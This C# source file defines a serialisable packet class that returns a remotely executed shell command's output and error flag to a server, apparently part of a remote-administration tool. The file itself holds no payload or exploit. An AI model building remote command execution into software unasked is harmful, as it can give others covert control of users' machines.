using Serveur.Controllers.Server;
using ZeroFormatter;

namespace Serveur.Packets.ClientPackets
{
    [ZeroFormattable]
    public class GetExecuteShellCmdResponse : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetExecuteShellCmdResponse;
            }
        }

        [Index(0)]
        public virtual string output { get; set; }

        [Index(1)]
        public virtual bool isError { get; set; }
            
        public GetExecuteShellCmdResponse()
        {
        }

        public GetExecuteShellCmdResponse(string output, bool isError)
        {
            this.output = output;
            this.isError = isError;
        }

        public void Execute(ClientMosaic client)
        {
            client.send(this);
        }
    }
}
